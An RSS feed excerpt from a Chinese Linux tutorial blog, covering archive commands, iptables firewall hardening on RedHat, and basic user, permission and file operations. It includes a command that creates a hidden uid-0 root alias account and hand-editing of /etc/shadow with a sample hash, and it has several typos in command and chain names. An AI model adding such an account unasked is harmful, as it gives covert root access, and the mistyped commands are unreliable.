<div><pre><code><span>gzip</span> <span>[</span>fileName<span>]</span>          <span># 压缩文件</span>
<span>gzip</span> -d <span>[</span>fileName<span>]</span>.gz    <span># 解压缩文件</span>
gunzip <span>[</span>fileName<span>]</span>.gz     <span># 解压缩文件</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>注意</p>
<p>只能压缩文件而不能压缩目录, 且不保留原文件</p>
</div>
<h2 id="tar-gz-格式" tabindex="-1"> .tar.gz 格式</h2>
<div><pre><code><span>tar</span> -czvf <span>[</span>folderName<span>]</span>.tar.gz <span>[</span>folderName<span>]</span>    <span># 压缩目录或文件</span>
<span>tar</span> -xzvf <span>[</span>folderName<span>]</span>.tar.gz               <span># 解压目录或文件</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="选项解释" tabindex="-1"> 选项解释</h3>
<div><pre><code>-c    <span># 打包</span>
-x    <span># 解包</span>
-v    <span># 显示详细信息</span>
-f    <span># 指定文件名</span>
-z    <span># 打包同时压缩 / 解压缩</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><div><p>注意</p>
<p>可以打包或压缩目录和文件, -f 选项是必须的, 且必须放在选项中的最后一位, 可以保留原文件</p>
</div>
<h2 id="zip-格式" tabindex="-1"> .zip 格式</h2>
<div><pre><code><span>zip</span> -r <span>[</span>folderName<span>]</span>.zip <span>[</span>folderName<span>]</span>   <span># 压缩目录</span>
<span>zip</span> <span>[</span>fileName<span>]</span>.zip <span>[</span>fileName<span>]</span>          <span># 压缩文件</span>
<span>unzip</span> <span>[</span>fileName<span>]</span>.zip                 <span># 压缩目录或文件</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="选项解释-1" tabindex="-1"> 选项解释</h3>
<div><pre><code>-r    压缩目录
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="gz-格式-1" tabindex="-1"> .gz 格式</h2>
<div><pre><code><span>gzip</span> <span>[</span>fileName<span>]</span>          <span># 压缩文件</span>
<span>gzip</span> -d <span>[</span>fileName<span>]</span>.gz    <span># 解压缩文件</span>
gunzip <span>[</span>fileName<span>]</span>.gz     <span># 解压缩文件</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>注意</p>
<p>只能压缩文件而不能压缩目录, 且不保留原文件</p>
</div>
<h2 id="zip-格式-1" tabindex="-1"> .zip 格式</h2>
<div><pre><code><span>zip</span> -r <span>[</span>folderName<span>]</span>.zip <span>[</span>folderName<span>]</span>     <span># 压缩目录</span>
<span>zip</span> <span>[</span>fileName<span>]</span>.zip <span>[</span>fileName<span>]</span>            <span># 压缩文件</span>
<span>unzip</span> -uo <span>[</span>fileName<span>]</span>.zip -d <span>[</span>folderName<span>]</span> <span># 解压缩目录或者文件</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>选项解释</p>
<div><pre><code>-r    <span># 压缩目录</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>注意</p>
<p>可以压缩目录或文件, -r 选项用于压缩目录, 可以保留原文件</p>
</div>
<h2 id="bz2-格式" tabindex="-1"> .bz2 格式</h2>
<div><pre><code><span>bzip2</span> -k <span>[</span>fileName<span>]</span>                         <span># 压缩文件且保留原文件</span>
<span>tar</span> -cjvf <span>[</span>folderName<span>]</span>.tar.bz2 <span>[</span>folderName<span>]</span>   <span># 压缩目录或文###件</span>
bunzip -k <span>[</span>fileName<span>]</span>.bz2                    <span># 解压缩文件</span>
<span>tar</span> -xjvf <span>[</span>folderName<span>]</span>.tar.bz2              <span># 解压缩文件</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>选项解释</p>
<div><pre><code>-k      <span># 产生压缩文件后保留原文件</span>
-j      <span># 格式为 .bz2 的压缩包</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><div><p>注意</p>
<p>bzip2 命令, 只能压缩文件, 不能压缩目录, 要使原文件保留, 使用 -k 选 项；要压缩目录使用 tar 命令的 -j 选项 用 tar 命令的 -j 选项</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>RedHat 系统安全加固（五）防火墙 (iptables) 的设置</title>
      <link>https://vxhly.github.io/views/liunx/iptables-settings.html</link>
      <guid>https://vxhly.github.io/views/liunx/iptables-settings.html</guid>
      <source url="https://vxhly.github.io/rss.xml">RedHat 系统安全加固（五）防火墙 (iptables) 的设置</source>
      <description>前言
本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记记录 RedHat 下的防火请的开启和关闭, 还有允许哪些端口通过防火墙。

</description>
      <category>liunx</category>
      <pubDate>Thu, 27 Oct 2016 10:00:55 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记记录 RedHat 下的防火请的开启和关闭, 还有允许哪些端口通过防火墙。</p>
</div>

<h2 id="防火墙的开启和关闭" tabindex="-1"> 防火墙的开启和关闭</h2>
<h3 id="永久性生效" tabindex="-1"> 永久性生效</h3>
<p>使用 <code>chkconfig</code> , 重启后不会复原</p>
<div><pre><code><span>chkconfig</span> iptables on         <span># 开启</span>
<span>chkconfig</span> iptables off        <span># 关闭</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="即时生效" tabindex="-1"> 即时生效</h3>
<p>使用 <code>service</code> , 重启后复原</p>
<div><pre><code><span>service</span> iptables start        <span># 开启</span>
<span>service</span> iptables stop         <span># 关闭</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="iptables-命令解释" tabindex="-1"> iptables 命令解释</h2>
<h3 id="选项解释" tabindex="-1"> 选项解释</h3>
<ul>
<li><strong>-t&lt;表&gt;</strong>: 指定要操纵的表；</li>
<li><strong>-A</strong>: 向规则链中添加条目；</li>
<li><strong>-D</strong>: 从规则链中删除条目；</li>
<li><strong>-I</strong>: 向规则链中插入条目；</li>
<li><strong>-R</strong>: 替换规则链中的条目；</li>
<li><strong>-L</strong>: 显示规则链中已有的条目；</li>
<li><strong>-F</strong>: 清楚规则链中已有的条目；</li>
<li><strong>-Z</strong>: 清空规则链中的数据包计算器和字节计数器；</li>
<li><strong>-N</strong>: 创建新的用户自定义规则链；</li>
<li><strong>-P</strong>: 定义规则链中的默认目标；</li>
<li><strong>-h</strong>: 显示帮助信息；</li>
<li><strong>-p</strong>: 指定要匹配的数据包协议类型；</li>
<li><strong>-s</strong>: 指定要匹配的数据包源 ip 地址；</li>
<li><strong>-j&lt;目标&gt;</strong>: 指定要跳转的目标；</li>
<li><strong>-i&lt;网络接口&gt;</strong>: 指定数据包进入本机的网络接口；</li>
<li><strong>-o&lt;网络接口&gt;</strong>: 指定数据包要离开本机所使用的网络接口。</li>
</ul>
<h3 id="命令输入顺序" tabindex="-1"> 命令输入顺序</h3>
<div><pre><code>iptables -t 表名 <span>&lt;</span>-A/I/D/R<span>></span> 规则链名 <span>[</span>规则号<span>]</span> <span>&lt;</span>-i/o 网卡名<span>></span> -p 协议名 <span>&lt;</span>-s 源IP/源子网<span>></span> --sport 源端口 <span>&lt;</span>-d 目标IP/目标子网<span>></span> --dport 目标端口 -j 动作
</code></pre><div aria-hidden="true"><div></div></div></div><ul>
<li><strong>表名包括</strong></li>
</ul>
<p>-- <strong>raw</strong>: 高级功能, 如: 网址过滤。 -- <strong>mangle</strong>: 数据包修改（QOS）, 用于实现服务质量。 -- <strong>net</strong>: 地址转换, 用于网关路由器。 -- <strong>filter</strong>: 包过滤, 用于防火墙规则。</p>
<ul>
<li><strong>规则链名包括</strong></li>
</ul>
<p>-- <strong>INPUT 链</strong>: 处理输入数据包。 -- <strong>OUTPUT 链</strong>: 处理输出数据包。 -- <strong>PORWARD 链</strong>: 处理转发数据包。 -- <strong>PREROUTING 链</strong>: 用于目标地址转换（DNAT）。 -- <strong>POSTOUTING 链</strong>: 用于源地址转换（SNAT）。</p>
<ul>
<li><strong>动作包括</strong></li>
</ul>
<p>-- <strong>ACCEPT</strong>: 接收数据包。 -- <strong>DROP</strong>: 丢弃数据包。 -- <strong>REDIRECT</strong>: 重定向、映射、透明代理。 -- <strong>SNAT</strong>: 源地址转换。 -- <strong>DNAT</strong>: 目标地址转换。 -- <strong>MASQUERADE</strong>: IP 伪装（NAT）, 用于 ADSL。 -- <strong>LOG</strong>: 日志记录。</p>
<h2 id="iptables-的设置与查看" tabindex="-1"> iptables 的设置与查看</h2>
<h3 id="查看-iptables-的设置" tabindex="-1"> 查看 iptables 的设置</h3>
<div><pre><code>iptables -nL
<span>service</span> iptables status
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><img src="/assets/iptables-1.png" alt="iptables 的设置与查看"></p>
<h3 id="清除已有-iptables-规则" tabindex="-1"> 清除已有 iptables 规则</h3>
<div><pre><code>iptables -F
iptables -X
iptables -Z
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/iptables-2.png" alt="iptables 的设置与查看"></p>
<h3 id="开放指定的端口" tabindex="-1"> 开放指定的端口</h3>
<div><pre><code>iptables -A INPUT -s <span>127.0</span>.0.1 -d <span>127.0</span>.0.1 -j ACCEPT
<span># 允许本地回环接口(即运行本机访问本机)</span>

iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
<span># 允许已建立的或相关连的通行</span>

iptables -A OUTPUT -j ACCEPT
<span># 允许所有本机向外的访问</span>

iptables -A INPUT -p tcp --dport <span>22</span> -j ACCEPT
<span># 允许访问 22 端口</span>

iptables -A INPUT -p tcp --dport <span>80</span> -j ACCEPT
<span># 允许访问 80 端口</span>

iptables -A INPUT -p tcp --dport <span>21</span> -j ACCEPT
<span># 允许 FTP  服务的 21 端口</span>

iptables -A INPUT -p tcp --dport <span>20</span> -j ACCEPT
<span># 允许 FTP 服务的 20 端口</span>

iptables -A INPUT -j reject
<span># 禁止其他未允许的规则访问</span>

iptables -A FORWARD -j REJECT
<span># 禁止其他未允许的规则访问</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p><code>-A</code> 是在 <code>iptables</code> 的最后添加一条规则, <code>-I</code> 是在 <code>iptables</code> 的前面添加一条规则</p>
</div>
<p><img src="/assets/iptables-3.png" alt="iptables 的设置与查看"></p>
<h3 id="屏蔽-ip" tabindex="-1"> 屏蔽 IP</h3>
<div><pre><code>iptables -I INPUT -s <span>123.45</span>.6.7 -j DROP
<span># 屏蔽单个 IP 的命令</span>

iptables -I INPUT -s <span>123.0</span>.0.0/8 -j DROP
<span># 封整个段即从 123.0.0.1 到 123.255.255.254 的命令</span>

iptables -I INPUT -s <span>124.45</span>.0.0/16 -j DROP
<span># 封 IP 段即从 123.45.0.1 到 123.45.255.254 的命令</span>

iptables -I INPUT -s <span>123.45</span>.6.0/24 -j DROP
<span># 封 IP 段即从 123.45.6.1 到 123.45.6.254 的命令</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="保存当前设置的规则" tabindex="-1"> 保存当前设置的规则</h3>
<div><pre><code>/etc/rc.d/init.d/iptables save
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/iptables-4.png" alt="iptables 的设置与查看"></p>
<br>
<p><img src="/assets/iptables-5.png" alt="iptables 的设置与查看"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/iptables-1.png" type="image/png"/>
    </item>
    <item>
      <title>Liunx 学习笔记（五）基础操作</title>
      <link>https://vxhly.github.io/views/liunx/liunx-basic-operation.html</link>
      <guid>https://vxhly.github.io/views/liunx/liunx-basic-operation.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 学习笔记（五）基础操作</source>
      <description>前言
本篇是 Liunx 的学习笔记系列第五篇, 这一篇将介绍 Liunx 的基础操作。很多人觉得 Liunx 非常难学, 但不其然, 只要掌握一些基础的命令操作, Liunx 还是非常好上手的。

</description>
      <category>liunx</category>
      <pubDate>Thu, 15 Sep 2016 16:09:27 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本篇是 Liunx 的学习笔记系列第五篇, 这一篇将介绍 Liunx 的基础操作。很多人觉得 Liunx 非常难学, 但不其然, 只要掌握一些基础的命令操作, Liunx 还是非常好上手的。</p>
</div>

<h2 id="liunx-终端" tabindex="-1"> Liunx 终端</h2>
<h3 id="终端和控制台的区别" tabindex="-1"> 终端和控制台的区别</h3>
<p>终端 (Terminal) 和控制台 (Console) 是有区别的</p>
<p>终端本质上是对应着 Liunx 上的 <code>/dev/tty</code> 设备, Liunx 的多用户登陆就是通过不同的 <code>/dev/tty</code> 设备完成的, Liunx 默认提供了 6 个纯命令行界面的 <code>&quot;terminal&quot;</code> （准确的说这里应该是 6 个 <code>virtual consoles</code> ）来让用户登录, 你可以通过使用 <code>[Ctrl]+[Alt]+[F1]～[F6]</code> 进行切换, 不过在在线实验环境中可能无法切换, 因为特殊功能按键会被你主机系统劫持。当你切换到其中一个终端后想要切换回图形界面, 你可以按下 <code>[Ctrl]+[Alt]+[F7]</code> 来完成</p>
<h3 id="shell" tabindex="-1"> Shell</h3>
<p>Shell 是指&quot;提供给使用者使用界面&quot;的软件（命令解析器）, 类似于 DOS 下的 command (命令行)和后来的 cmd.exe。之所以被称作 shell 是因为它隐藏了操作系统底层的细节。就像是个 Shell (壳), 有壳就有核, 这里的核就是指的 UNIX/Liunx 内核。</p>
<h3 id="重要的快捷键-只列出常用的" tabindex="-1"> 重要的快捷键（只列出常用的）</h3>
<table>
<thead>
<tr>
<th>按键</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Tab</strong></td>
<td>进行命令补全</td>
</tr>
<tr>
<td><strong>Ctrl+c</strong></td>
<td>强行终止当前程序（最常用, 你可以放心它并不会使终端退出)</td>
</tr>
<tr>
<td><strong>Ctrl+d</strong></td>
<td>这个才是强制退出终端的(不用敲 exit 了)</td>
</tr>
<tr>
<td><strong>Ctrl+s</strong></td>
<td>暂定当前程序, 暂停后按下任意键恢复运行(网络交互有用)</td>
</tr>
<tr>
<td><strong>Ctrl+z</strong></td>
<td>将当前程序放到后台运行, 恢复到前台为命令 fg</td>
</tr>
<tr>
<td><strong>Ctrl+u</strong></td>
<td>删除光标所在的整行</td>
</tr>
<tr>
<td><strong>Ctrl+l</strong></td>
<td>清屏, 最常用</td>
</tr>
<tr>
<td><strong>Ctrl+k</strong></td>
<td>删除从光标所在位置到行末</td>
</tr>
<tr>
<td><strong>Alt+Backspace</strong></td>
<td>向前删除一个单词</td>
</tr>
<tr>
<td><strong>Shift+PgUp</strong></td>
<td>将终端显示向上滚动</td>
</tr>
<tr>
<td><strong>Shift+PgDn</strong></td>
<td>将终端显示向下滚动</td>
</tr>
</tbody>
</table>
<h3 id="使用通配符" tabindex="-1"> 使用通配符</h3>
<p><code>举例:</code></p>
<div><pre><code><span>touch</span> love_<span>{</span><span>1</span><span>..</span><span>10</span><span>}</span>_Liunx.txt
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-basic-1.png" alt="使用通配符"></p>
<h3 id="shell-常用通配符" tabindex="-1"> shell 常用通配符</h3>
<table>
<thead>
<tr>
<th>通配符</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>*</strong></td>
<td>匹配 0 或多个字符</td>
</tr>
<tr>
<td><strong>?</strong></td>
<td>匹配任意一个字符</td>
</tr>
<tr>
<td><strong>[list]</strong></td>
<td>匹配 list 中的任意单一字符</td>
</tr>
<tr>
<td><strong>[!list]</strong></td>
<td>匹配 除 list 中的任意单一字符以外的字符</td>
</tr>
<tr>
<td><strong>[c1-c2]</strong></td>
<td>匹配 c1-c2 中的任意单一字符 如: <code>[0-9] [a-z]</code></td>
</tr>
<tr>
<td><strong>{string1, string2, ...}</strong></td>
<td>匹配 sring1 或 string2 (或更多)其一字符串</td>
</tr>
<tr>
<td><strong>{c1..c2}</strong></td>
<td>匹配 c1-c2 中全部字符 如 <code>{1..10}</code></td>
</tr>
</tbody>
</table>
<h2 id="命令手册速查" tabindex="-1"> 命令手册速查</h2>
<p>Liunx 下命令成千上百, 有个速查手册也是不错的, <a href="http://man.linuxde.net/" target="_blank" rel="noopener noreferrer">Liunx 命令速查手册</a></p>
<h2 id="liunx-用户管理" tabindex="-1"> Liunx 用户管理</h2>
<h3 id="获取当前登录的用户" tabindex="-1"> 获取当前登录的用户</h3>
<div><pre><code><span>who</span> <span># 获取当前登录的所有用户信息（包括远程登录）</span>
<span>whoami</span> <span># 获取当前登录的用户名</span>
<span>who</span> am i <span># 获取当前登录用户的信息</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/liunx-basic-2.png" alt="获取当前登录的用户"></p>
<div><p>提示</p>
<p>第一列表示打开当前伪终端的用户的用户名<br> 第二列的 pts/0 中 pts 表示伪终端, 所谓伪是相对于 /dev/tty 设备而言的, 使用 <code>[Ctrl]+[Alt]+[F1]～[F7]</code> 进行切换的 /dev/tty 设备, 这是&quot;真终端&quot;, 伪终端就是当你在图形用户界面使用 /dev/tty7 时每打开一个终端就会产生一个伪终端, pts/0 后面那个数字就表示打开的伪终端序号<br> 第三列则表示当前伪终端的启动时间</p>
</div>
<h3 id="创建用户、切换用户" tabindex="-1"> 创建用户、切换用户</h3>
<div><pre><code>adduser <span>[</span>userName<span>]</span>            <span># 通过询问的方式进行新增用户</span>
<span>useradd</span> -m <span>[</span>userName<span>]</span>         <span># 通过自行添加参数方式新增用户</span>
<span>useradd</span> -u <span>0</span> -o <span>[</span>userName<span>]</span>    <span># 添加 uid 为 0 的用户,即 root 用户的别名,拥有 root 的权限</span>
<span>userdel</span> -r <span>[</span>userName<span>]</span>         <span># 永久删除用户</span>
<span>id</span>                          <span># 查看用户的 uid 或 gid 等信息</span>
<span>su</span> -                        <span># 切换到 root 用户</span>
<span>su</span> - <span>[</span>userName<span>]</span>             <span># 切换某一个用户</span>
<span>passwd</span>                      <span># 为当前用户设置密码</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>用户信息将被保存至 <code>/etc/passwd</code>, 用户密码将被保存至 <code>/etc/shadow</code><br> 使用 root 用户可以修改其内容, 只需使用 wq!, 强制保存就好</p>
</div>
<h3 id="创建组、添加组成员" tabindex="-1"> 创建组、添加组成员</h3>
<div><pre><code><span>groupadd</span> <span>[</span>groupName<span>]</span>                <span># 添加用户组</span>
<span>groupdel</span> <span>[</span>groupName<span>]</span>                <span># 删除用户组</span>
<span>usermod</span> -G <span>[</span>groupName<span>]</span> <span>[</span>userName<span>]</span>     <span># 将用户 添加至用户组,-G 附属组,-g 主属组</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>组信息将被保存至 <code>/etc/group</code>, 组密码将保存至 <code>/etc/gshadow</code><br> 使用 root 用户可以修改其内容, 只需使用 wq!, 强制保存就好</p>
</div>
<h3 id="禁用和解锁用户" tabindex="-1"> 禁用和解锁用户</h3>
<h4 id="passwd-方法" tabindex="-1"> passwd 方法</h4>
<div><pre><code><span>passwd</span> -l <span>[</span>userName<span>]</span>    <span>#禁用</span>
<span>passwd</span> -u <span>[</span>userName<span>]</span>    <span>#解锁</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h4 id="修改-etc-shadow-文件-root-用户" tabindex="-1"> 修改 <code>/etc/shadow</code> 文件（root 用户）</h4>
<div><pre><code><span>vim</span> /etc/shadow
</code></pre><div aria-hidden="true"><div></div></div></div><p>禁用则在密码位前手工添加 ! （启用删除 ! 即可）, 如:</p>
<div><pre><code>test:<span>!</span><span>$1</span><span>$afiVSYfG</span><span>$utdc2qWLNrqNcy63Ca8301</span>:16998:0:99999:7:::
</code></pre><div aria-hidden="true"><div></div></div></div><p>或</p>
<div><pre><code>test:<span>!</span><span>!</span><span>$1</span><span>$afiVSYfG</span><span>$utdc2qWLNrqNcy63Ca8301</span>:16998:0:99999:7:::
</code></pre><div aria-hidden="true"><div></div></div></div><p>使用 <code>:wq!</code> 强制保存</p>
<h4 id="usermod-方法" tabindex="-1"> usermod 方法</h4>
<div><pre><code><span>usermod</span> -L <span>[</span>userName<span>]</span>    <span>#禁用</span>
<span>usermod</span> -U <span>[</span>userName<span>]</span>    <span>#解锁</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="设置用户一登录就要修改密码" tabindex="-1"> 设置用户一登录就要修改密码</h3>
<div><pre><code>chage -d <span>0</span> <span>[</span>userName<span>]</span>
<span># 这个命令其实是把密码修改日期归 0 了 （/etc/shadow 文件第 3 个字段）</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="查看当前登录的用户的环境变量" tabindex="-1"> 查看当前登录的用户的环境变量</h3>
<div><pre><code><span>env</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="liunx-文件权限" tabindex="-1"> Liunx 文件权限</h2>
<h3 id="查看文件权限" tabindex="-1"> 查看文件权限</h3>
<div><pre><code><span>ls</span> -l       <span># 可以简写成 ll,注意有些版本的 Liunx 不支持</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="权限介绍" tabindex="-1"> 权限介绍</h4>
<p><img src="/assets/liunx-basic-3.png" alt="权限介绍"></p>
<br>
<p><img src="/assets/liunx-basic-4.png" alt="权限介绍"></p>
<div><p>提示</p>
<p>通常我们使用数字表示权限, 4 为读取权限, 2 为写入权限, 1 为执行权限。所以权限为 777 的为最高权限</p>
</div>
<h3 id="权限的设置" tabindex="-1"> 权限的设置</h3>
<div><pre><code><span>chmod</span> <span>777</span> text.txt    <span># 设置最高权限</span>
<span>chmod</span> o+w text.txt    <span># 为其他用户添加写权限</span>
<span>chmod</span> g-r text.txt    <span># 为组中的所有用户去除读权限</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="修改所属者和所属组" tabindex="-1"> 修改所属者和所属组</h3>
<div><pre><code><span>chown</span> root text.txt         <span># 修改所属者</span>
<span>chgrp</span> text text.txt         <span># 修该所属组</span>
<span>chown</span> root:text text.txt    <span># 修改所属者和所属组</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="liunx-文件的基本操作-很重要且很常用" tabindex="-1"> Liunx 文件的基本操作（很重要且很常用）</h2>
<h3 id="文件操作" tabindex="-1"> 文件操作</h3>
<div><pre><code><span>touch</span> <span>test</span>                            <span># 新建一个空文件</span>
<span>echo</span> <span>"this is a text"</span> <span>></span> test.txt      <span># 输出内容重定向到文件,> 覆盖操作</span>
<span>echo</span> <span>"this is a text"</span> <span>>></span> test.txt     <span># 输出内容重定向到文件,>> 追加操作</span>
<span>rm</span> -f test.txt                        <span># 删除文件</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h3 id="目录操作" tabindex="-1"> 目录操作</h3>
<div><pre><code><span>mkdir</span> <span>[</span>folderName<span>]</span>                        <span># 新建目录</span>
<span>mkdir</span> -p <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span>              <span># 若父级目录不存在,则一起创建</span>
<span>rm</span> -rf <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span>                <span># 删除目录</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="复制操作" tabindex="-1"> 复制操作</h3>
<div><pre><code><span>cp</span> <span>test</span> <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span>                       <span># 复制文件爱内</span>
<span>cp</span> -r <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span> <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span>     <span># 复制目录</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="移动、重命名操作" tabindex="-1"> 移动、重命名操作</h3>
<div><pre><code><span>mv</span> <span>[</span>fileName<span>]</span> <span>[</span>path<span>]</span>/<span>[</span>folderName<span>]</span>           <span># 移动文件</span>
<span>mv</span> <span>[</span>fileName1<span>]</span> <span>[</span>fileName2<span>]</span>                  <span># 重命名</span>

<span># 先用通配符批量创建 5 个文件</span>
<span>touch</span> file<span>{</span><span>1</span><span>..</span><span>5</span><span>}</span>.txt
<span># 批量将这 5 个后缀为 .txt 的文本文件重命名为以 .c 为后缀的文件</span>
<span>rename</span> <span>'s/\.txt/\.c/'</span> *.txt
<span># 批量将这 5 个文件,文件名改为大写</span>
<span>rename</span> <span>'y/a-z/A-Z/'</span> *.c
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="查看文件" tabindex="-1"> 查看文件</h3>
<div><pre><code><span>cat</span> /etc/passwd
<span>tail</span> -n <span>5</span> /etc/passwd       <span># 只输出文件的末尾 5 行</span>
<span>file</span> /bin/ls                <span># 可以查看文件的类型</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>适用于快速查看文件, 都是用来打印文件内容到标准输出（终端), 相同的命令有: cat (正序)、tac (倒序)、tail(按要求输出)和 nl 命令</p>
<h2 id="搜索文件" tabindex="-1"> 搜索文件</h2>
<h3 id="whereis" tabindex="-1"> whereis</h3>
<p>直接从数据库中查询简单快速</p>
<div><pre><code><span>whereis</span> <span>ls</span>      <span># 直接从数据库中查询简单快速</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="locate" tabindex="-1"> locate</h3>
<p>快而全</p>
<p>通过 <code>&quot;/var/lib/mlocate/mlocate.db&quot;</code> 数据库查找, 不过这个数据库也不是实时更新的, 系统会使用定时任务每天自动执行 updatedb 命令更新一次, 所以有时候你刚添加的文件, 它可能会找不到, 你就得自己执行一次 updatedb 命令（在我们的环境中必须先执行一次该命令）。它可以用来查找指定目录下的不同文件类型,</p>
<p>如: 查找 <code>/etc</code> 下所有以 sh 开头的文件</p>
<div><pre><code><span>locate</span> /etc/sh
</code></pre><div aria-hidden="true"><div></div></div></div><p>注意, 它不只是在 etc 目录下查找并会自动递归子目录进行查找 查找 <code>/usr/share/</code> 下所有 jpg 文件</p>
<div><pre><code><span>locate</span> /usr/share/*.jpg
</code></pre><div aria-hidden="true"><div></div></div></div><p>注意要添加 <strong>*</strong> 号前面的反斜杠转义, 否则会无法找到 只统计数目可以加上 -c 参数, -i 参数忽略大小写进行查找, whereis 的 -b, -m, -s 同样适用</p>
<h3 id="which" tabindex="-1"> which</h3>
<p>避免了进入程序进行测试, 很有用</p>
<p>which 本身是 shell 内建的一个命令, 我们通常使用 which 来确定是否安装了某个指定的软件, 因为它只从 PATH 环境变量指定的路径中去搜索命令</p>
<div><pre><code><span>which</span> <span>man</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="find" tabindex="-1"> find</h3>
<p>太精和太细, 知道前面的命令就已经足够了</p>
<p>find 应该是这几个命令中最强大的了, 它不但可以通过文件类型、文件名进行查找而且可以根据文件的属性（如文件的时间戳, 文件的权限等）进行搜索</p>
<p>举个栗子: 在指定目录下搜索指定文件名的文件</p>
<div><pre><code><span>find</span> /etc/ -name interfaces
</code></pre><div aria-hidden="true"><div></div></div></div><p>注意 find 命令的路径是作为第一个参数的, 基本命令格式为 <code>find [path] [option] [action]</code></p>
<h2 id="简单文件系统操作" tabindex="-1"> 简单文件系统操作</h2>
<h3 id="查看磁盘和目录的容量" tabindex="-1"> 查看磁盘和目录的容量</h3>
<h4 id="使用-df-命令查看磁盘的容量" tabindex="-1"> 使用 df 命令查看磁盘的容量</h4>
<div><pre><code><span>df</span>            <span># 以 blocks 的大小展示</span>
<span>df</span> -h         <span># 人性化输出,以更易读的方式展示</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h4 id="使用-du-命令查看目录的容量" tabindex="-1"> 使用 du 命令查看目录的容量</h4>
<div><pre><code><span># 默认同样以blocks的大小展示</span>
<span>du</span>
<span># 加上-h参数,以更易读的方式展示</span>
<span>du</span> -h

<span># 只查看1级目录的信息</span>
<span>du</span> -h -d <span>0</span> ~
<span># 查看2级$ du -h -d 1 ~</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="挂载光盘和卸载光盘" tabindex="-1"> 挂载光盘和卸载光盘</h3>
<div><pre><code><span>mount</span> /dev/cdrom /mnt/cdrom     <span># 挂载光盘</span>
<span>umount</span> /dev/cdrom               <span># 卸载光盘</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="wc-命令-简单小巧的计数工具" tabindex="-1"> wc 命令, 简单小巧的计数工具</h3>
<div><pre><code><span>wc</span> /etc/passwd
</code></pre><div aria-hidden="true"><div></div></div></div><p>分别只输出行数、单词数、字节数、字符数和输入文本中最长一行的字节数</p>
<div><pre><code><span># 行数</span>
<span>wc</span> -l /etc/passwd

<span># 单词数</span>
<span>wc</span> -w /etc/passwd

<span># 字节数</span>
<span>wc</span> -c /etc/passwd

<span># 字符数</span>
<span>wc</span> -m /etc/passwd

<span># 最长行字节数</span>
<span>wc</span> -L /etc/passwd
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>注意</p>
<p>对于西文字符来说, 一个字符就是一个字节, 但对于中文字符一个汉子是大于 2 个字节的, 具体数目是由字符编码决定的</p>
</div>
